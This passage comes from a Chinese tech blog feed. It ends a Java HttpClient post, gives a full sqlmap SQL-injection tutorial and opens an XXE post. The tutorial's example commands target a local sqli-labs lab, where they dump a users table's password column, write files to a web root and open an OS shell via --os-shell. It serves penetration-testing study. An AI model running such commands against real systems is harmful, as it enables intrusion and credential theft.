httpClient.getHttpConnectionManager().getParams().setConnectionTimeout(<span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">// 创建GET方法</span><br>        <span class="hljs-type">GetMethod</span> <span class="hljs-variable">getMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GetMethod</span>(uri);<br>        <span class="hljs-comment">// 设置get请求超时时间</span><br>        getMethod.getParams().setParameter(HttpMethodParams.SO_TIMEOUT, <span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">// 设置重试机制</span><br>        getMethod.getParams().setParameter(HttpMethodParams.RETRY_HANDLER, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHttpMethodRetryHandler</span>(<span class="hljs-number">3</span>, <span class="hljs-literal">true</span>));<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 发送请求</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> httpClient.executeMethod(getMethod);<br>            <span class="hljs-comment">// 判断状态码</span><br>            <span class="hljs-keyword">if</span> (statusCode == HttpStatus.SC_OK)&#123;<br>                <span class="hljs-comment">// 响应流</span><br>                inputStream = getMethod.getResponseBodyAsStream();<br>                <span class="hljs-comment">//</span><br>                bufferedReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, StandardCharsets.UTF_8));<br><br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    stringBuffer.append(tmp).append(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br><br>                result = stringBuffer.toString();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != bufferedReader)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    bufferedReader.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != inputStream)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 释放连接</span><br>            getMethod.releaseConnection();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">queryPost</span><span class="hljs-params">(String uri, Map&lt;String, Object&gt; paramMap)</span>&#123;<br>        <span class="hljs-comment">// 输入流</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 创建HttpClient实例</span><br>        <span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<br>        <span class="hljs-comment">// 设置http连接主机服务超时时间</span><br>        <span class="hljs-comment">// 先获取连接管理器对象，再获取参数对象,再进行参数的赋值</span><br>        httpClient.getHttpConnectionManager().getParams().setConnectionTimeout(<span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">// 创建GET方法</span><br>        <span class="hljs-type">PostMethod</span> <span class="hljs-variable">postMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PostMethod</span>(uri);<br>        <span class="hljs-comment">// 设置get请求超时时间</span><br>        postMethod.getParams().setParameter(HttpMethodParams.SO_TIMEOUT, <span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">// 设置参数</span><br>        NameValuePair[] nvp = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != paramMap &amp;&amp; paramMap.size() &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">// 创建键值参数对象数组，大小为参数的个数</span><br>            nvp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NameValuePair</span>[paramMap.size()];<br>            <span class="hljs-comment">// 循环遍历参数集合map</span><br>            Set&lt;Map.Entry&lt;String, Object&gt;&gt; entrySet = paramMap.entrySet();<br>            <span class="hljs-comment">// 获取迭代器</span><br>            Iterator&lt;Map.Entry&lt;String, Object&gt;&gt; iterator = entrySet.iterator();<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (iterator.hasNext()) &#123;<br>                Map.Entry&lt;String, Object&gt; mapEntry = iterator.next();<br>                <span class="hljs-comment">// 从mapEntry中获取key和value创建键值对象存放到数组中</span><br>                <span class="hljs-keyword">try</span> &#123;<br>                    nvp[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NameValuePair</span>(mapEntry.getKey(),<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(mapEntry.getValue().toString().getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                &#125; <span class="hljs-keyword">catch</span> (UnsupportedEncodingException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                index++;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 判断nvp数组是否为空</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != nvp) &#123;<br>            <span class="hljs-comment">// 将参数存放到requestBody对象中</span><br>            postMethod.setRequestBody(nvp);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> httpClient.executeMethod(postMethod);<br>            <span class="hljs-keyword">if</span> (statusCode == HttpStatus.SC_OK)&#123;<br>                inputStream = postMethod.getResponseBodyAsStream();<br>                bufferedReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream, StandardCharsets.UTF_8));<br>                <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">while</span> ((tmp = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    stringBuffer.append(tmp).append(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br><br>                result = stringBuffer.toString();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != bufferedReader)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    bufferedReader.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != inputStream)&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    inputStream.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 释放连接</span><br>            postMethod.releaseConnection();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="org-apache-http-client"><a href="#org-apache-http-client" class="headerlink" title="org.apache.http.client"></a><code>org.apache.http.client</code></h2><p>[org.apache.http.client.HttpClient使用方法 - 江期玉 - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/jiangfeilong/p/11109223.html#:~:text=org.apache.http.client%E5%9C%A8%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E5%89%8D%EF%BC%8C%E5%81%87%E5%A6%82%E5%AF%B9%E6%9F%90%E4%B8%AA%E5%8F%82%E6%95%B0a">https://www.cnblogs.com/jiangfeilong/p/11109223.html#:~:text=org.apache.http.client在发起请求前，假如对某个参数a</a> 进行url encode编码。,服务端必须进行url decode。 %2F%2F客户端编码)</p><p>这个的版本搞不清楚。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[工具] sqlmap教程</title>
    <link href="/2022/10/15/%5B%E5%B7%A5%E5%85%B7%5D%20sqlmap%E6%95%99%E7%A8%8B/"/>
    <url>/2022/10/15/%5B%E5%B7%A5%E5%85%B7%5D%20sqlmap%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap教程"><a href="#sqlmap教程" class="headerlink" title="sqlmap教程"></a>sqlmap教程</h1><p><a href="https://sqlmap.org/">sqlmap</a>是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。sqlmap 可以运行在 Python <code>2.6</code>, <code>2.7</code> 和 <code>3.x</code> 版本的任何平台上。</p><p><a href="https://github.com/sqlmapproject/sqlmap">项目地址</a></p><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">官方手册</a></p><p><a href="https://asciinema.org/a/46601">快速使用视频</a></p><h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li><code>-h</code><br>显示基本帮助信息</li><li><code>-hh</code><br>显示高级帮助信息</li><li><code>--version</code><br>显示版本号</li><li><code>-v</code><br>详细信息登记（0-6，默认1）<ul><li>0：只显示python错误以及重要信息</li><li>1：显示信息以及警告</li><li>2：显示debug消息</li><li>3：显示注入payload</li><li>4：显示http请求</li><li>5：显示http响应头</li><li>6：显示http响应内容</li></ul></li></ul><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul><li><code>-u</code><br>指定url</li><li><code>-d</code><br>直接连接数据库</li><li><code>-l</code><br>从burp代理日志解析目标</li><li><code>-r</code><br>从文件加载http请求</li><li><code>-g</code><br>将google dork的结果作为目标url</li><li><code>-c</code><br>从INI配置文件加载选项</li><li><code>-m</code><br>从文件加载多个url</li></ul><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><ul><li><p><code>-A</code><br>指定User-Agent头</p></li><li><p><code>-H</code><br>额外的header</p></li><li><p><code>--method=METHOD</code></p><p>指定请求HTTP方法（比如：PUT）</p></li><li><p><code>--data=DATA</code><br>指定post请求的参数（比如：”id&#x3D;1”）</p></li><li><p><code>--param-del=PARA</code><br>指定参数的分隔符（比如：”&amp;”）</p></li><li><p><code>--cookie=COOKIE</code><br>http请求的cookie（比如：”PHPSESSID&#x3D;a8d127e..”）</p></li><li><p><code>--cookie-del=</code><br>指定cookie的分隔符</p></li><li><p><code>--random-agent</code><br>使用随机的User-Agent</p></li><li><p><code>--referer=REFERER</code><br>请求的referer</p></li><li><p><code>--headers=HEADERS</code><br>额外的headers（比如：”Accept-Language: fr\nETag: 123”）</p></li><li><p><code>--proxy=PROXY</code><br>使用代理</p></li><li><p><code>--timeout=</code><br>请求超时秒数</p></li><li><p><code>--retries=</code><br>连接超时重试次数</p></li><li><p><code>--csrf-token=</code><br>csrf-token参数</p></li></ul><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ul><li><code>-p</code><br>指定测试参数</li><li><code>--skip=</code><br>跳过指定参数的测试</li><li><code>--skip-static</code><br>跳过测试静态的参数</li><li><code>--dbms</code><br>指定具体DBMS</li><li><code>--os</code><br>指定DBMS操作系统</li><li><code>--tamper</code><br>指定使用的脚本</li></ul><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><ul><li><code>--level=</code><br>测试登记（1-5，默认1）</li><li><code>--risk=</code><br>指定测试风险（0-3，默认1）</li><li><code>--string=</code><br>登录成功时，页面所含有的“关键字” 用于证明已经登录成功</li><li><code>--not-string=</code><br>登录成功时，页面所含有的“关键字” 用于证明已经登录失败</li><li><code>--code=</code><br>查询为真时，匹配HTTP代码</li><li><code>--smart</code><br>当有大量检测目标时，只选择基于错误的检测结果</li><li><code>--text-only</code><br>仅基于文本内容比较网页</li><li><code>--titles</code><br>仅基于标题比较网页</li></ul><h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h3><ul><li><p><code>--technique</code><br>指定sql注入技术（默认BEUSTQ）</p><p>B    基于布尔的盲注</p><p>T    基于时间的盲注</p><p>E    基于报错的注入</p><p>U    基于UNION查询注入</p><p>S    基于多语句查询注入</p></li><li><p><code>--time-sec=</code><br>基于时间注入检测相应的延迟时间（默认为5秒）</p></li><li><p><code>--union-clos=</code><br>进行查询时，指定列的范围</p></li><li><p><code>--union-char=</code><br>指定暴力破解列数的字符</p></li></ul><h3 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h3><ul><li><code>-f</code><br>查询目标DBMS版本指纹信息</li></ul><h3 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h3><ul><li><code>-a</code><br>查询所有</li><li><code>-b</code><br>查询目标DBMS banner信息</li><li><code>--current-user</code><br>查询目标DBMS当前用户</li><li><code>--current-db</code><br>查询目标DBMS当前数据库</li><li><code>--is-dba</code><br>查询目标DBMS当前用户是否为DBA</li><li><code>--users</code><br>枚举目标DBMS所有的用户</li><li><code>--passwords</code><br>枚举目标DBMS用户密码哈希值</li><li><code>--privileges</code><br>枚举目标DBMS用户的权限</li><li><code>--roles</code><br>枚举DBMS用户的角色</li><li><code>--dbs</code><br>枚举DBMS所有的数据库</li><li><code>--tables</code><br>枚举DBMS数据库中所有的表</li><li><code>--columns</code><br>枚举DBMS数据库表中所有的列</li><li><code>--count</code><br>检索表的条目的数量</li><li><code>--dump</code><br>存储DBMS数据库的表中的条目</li><li><code>--dump-all</code><br>存储DBMS所有数据库表中的条目</li><li><code>-D</code><br>指定进行枚举的数据库名称</li><li><code>-T</code><br>指定进行枚举的数据库表名称</li><li><code>-C</code><br>指定进行枚举的数据库列名称</li><li><code>--exclude-sysdbs</code><br>枚举表时排除系统数据库</li><li><code>--sql-query</code><br>指定查询的sql语句</li><li><code>--sql-shell</code><br>提示输入一个交互式sql shell</li></ul><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><ul><li><code>--common-tables</code><br>暴力破解表</li><li><code>--common-colomns</code><br>暴力破解列</li></ul><h3 id="文件系统访问"><a href="#文件系统访问" class="headerlink" title="文件系统访问"></a>文件系统访问</h3><p><code>--file-read</code>               从目标数据库管理文件系统读取文件</p><p><code>--file-write</code>                           上传文件到目标数据库管理文件系统</p><p><code>--file-dest</code>                             指定写入文件的绝对路径</p><p><code>--os-cmd=</code>                           执行操作系统命令</p><p><code>--os-shell</code>                            交互式的系统shell</p><p><code>--os-pwn</code>                             获取一个OOB shell，Meterpreter或者VNC</p><p><code>--os-smbrelay</code>                    一键 获取一个OOB shell，Meterpreter或者VNC</p><p><code>--os-bof</code>                              储存过程缓冲区溢出利用</p><p><code>--os-esc</code>                              数据库进程用户权限提升</p><p><code>--msf-path=</code>                        Metasploit  Framework本地安装路径</p><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><p><code>-s</code>                                     sqlite会话文件保存位置</p><p><code>-t</code>                                      记录所有HTTP流量到指定文件中</p><p><code>--batch</code>                             测试过程中， 执行所有默认配置</p><p><code>--charset=v</code>                      强制用于数据检索的字符编码 </p><p><code>--crawl=</code>                           从目标URL开始爬取网站</p><p><code>--crawl-exclude=</code>              禁止爬取某个页面（eg：logout）</p><p><code>--csv-del=</code>                        指定CSV输出中使用的的字符</p><p><code>--dump-format=</code>               储存数据的方式（CSV(default)，HTML，SQLITE）</p><p><code>--flush-session</code>                 刷新当前目标的会话文件</p><p><code>--fresh-queries</code>                 忽略会话文件中储存的查询结果，重新查询</p><p><code>--hex</code>                                使用DBMS hex函数进行数据检索</p><p><code>--outpout-dir=</code>                  自定义输出目录</p><p><code>--save=</code>                            保存选项到INI配置文件中</p><p><code>--scope=</code>                          使用正则表达式从提供的日志中guo’l</p><p><code>--alert</code>                               再找到SQL注入时运行主机操作系统命令</p><p><code>--purge-output</code>                  安全的从输出目录中删除所有内容</p><p><code>--sqlmap-shell</code>                  提示输入交互式sqlmap  shell</p><p><code>--update</code>                           更新sqlmap</p><h2 id="sqlmap使用示例"><a href="#sqlmap使用示例" class="headerlink" title="sqlmap使用示例"></a>sqlmap使用示例</h2><p>指定目标URL</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sqlmap</span> -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></code></pre></td></tr></table></figure><p>从文件获取多个url</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -m <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>从文件加载http请求</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sqlmap</span> -r  url.txt<br></code></pre></td></tr></table></figure><p>利用google获取目标</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">sqlmap -g <span class="hljs-string">&quot;inurl:<span class="hljs-subst">\&quot;</span>.php?id=1<span class="hljs-subst">\&quot;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>从burp日志中获取目标</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sqlmap</span> -l burp.txt<br></code></pre></td></tr></table></figure><p>POST参数注入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;</span>  --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span><br></code></pre></td></tr></table></figure><p>http请求头的注入，通常保存在文件中，指定等级（level&gt;2），在文件中需要检测的参数中加<code>*</code>，比如这里探测<code>Cookie</code>，</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sqlmap</span>  -r <span class="hljs-string">&quot;http.txt&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511160325787.png" alt="img"></p><h2 id="探测流程"><a href="#探测流程" class="headerlink" title="探测流程"></a>探测流程</h2><p>通用的GET请求注入流程：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">step1：sqlmap -u <span class="hljs-selector-attr">[<span class="hljs-string">&quot;URL&quot;</span>]</span> <span class="hljs-comment">//测试是否存在注入</span><br><br>step2：sqlmap -u <span class="hljs-selector-attr">[<span class="hljs-string">&quot;URL&quot;</span>]</span> -current-db <span class="hljs-comment">//查询当前数据库</span><br><br>step3：sqlmap -u <span class="hljs-selector-attr">[<span class="hljs-string">&quot;URL&quot;</span>]</span> -D <span class="hljs-selector-attr">[<span class="hljs-string">&quot;数据库名&quot;</span>]</span> <span class="hljs-attr">--tables</span> <span class="hljs-comment">//查询当前数据库中的所有表</span><br><br>step4：sqlmap -u <span class="hljs-selector-attr">[<span class="hljs-string">&quot;URL&quot;</span>]</span> -D <span class="hljs-selector-attr">[<span class="hljs-string">&quot;数据库名&quot;</span>]</span> -T <span class="hljs-selector-attr">[<span class="hljs-string">&quot;表名&quot;</span>]</span> <span class="hljs-attr">--columns</span> <span class="hljs-comment">//查询指定库中指定表的所有列(字段)</span><br><br>step5：sqlmap -u <span class="hljs-selector-attr">[<span class="hljs-string">&quot;URL&quot;</span>]</span> -D <span class="hljs-selector-attr">[<span class="hljs-string">&quot;数据库名&quot;</span>]</span> -T <span class="hljs-selector-attr">[<span class="hljs-string">&quot;表名&quot;</span>]</span> -C <span class="hljs-selector-attr">[<span class="hljs-string">&quot;列名&quot;</span>]</span> <span class="hljs-attr">--dump</span> <span class="hljs-comment">//打印出指定库中指定表指定列中的字段内容</span><br></code></pre></td></tr></table></figure><p>如果是POST请求就将请求保存到文件中，在需要探测的参数或头后面加<code>*</code>，使用<code>-r</code>指定文件。</p><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span> <span class="hljs-params">--dbs</span>  <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511161957832.png" alt="img"></p><h3 id="查看数据库里面的表"><a href="#查看数据库里面的表" class="headerlink" title="查看数据库里面的表"></a>查看数据库里面的表</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span> -D security <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511162048207.png" alt="img"></p><h3 id="查看数据库表里面的列"><a href="#查看数据库表里面的列" class="headerlink" title="查看数据库表里面的列"></a>查看数据库表里面的列</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span> -D security -<span class="hljs-built_in">T</span> users --<span class="hljs-built_in">columns</span>   --batch<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200511162313137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="查看数据库列里面的具体的值"><a href="#查看数据库列里面的具体的值" class="headerlink" title="查看数据库列里面的具体的值"></a>查看数据库列里面的具体的值</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D <span class="hljs-keyword">security</span> -T users -C <span class="hljs-keyword">password</span> <span class="hljs-comment">--dump  --batch</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/2020051116253980.png" alt="img"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p><strong>使用条件：</strong></p><ol><li>MySQL数据库版本小于5.0，没有information——schema表。</li><li>Microssoft Access数据库。</li><li>当前用户没有权限读取系统中保存的数据。</li></ol><p>暴力破解中破解表名的文件位于<code>common-tables.txt</code> 中，同理破解列名的文件位于<code>common-columns.txt</code> 中</p><h3 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span>  -D security <span class="hljs-params">--common-tables</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511164600263.png" alt="img"></p><h3 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span>  -D security -Tusers <span class="hljs-params">--common-columns</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511164614628.png" alt="img"></p><h2 id="读取和上传文件"><a href="#读取和上传文件" class="headerlink" title="读取和上传文件"></a>读取和上传文件</h2><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span>   --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">read</span> <span class="hljs-string">&quot;C:/post.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511170318789.png" alt="img"></p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span>   --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-string">&quot;/root/1.txt&quot;</span> --<span class="hljs-keyword">file</span>-dest <span class="hljs-string">&quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20200511170525553.png" alt="img"></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span>  <span class="hljs-comment">--os-shell</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] xml实体注入</title>
    <link href="/2022/10/11/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/10/11/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
    
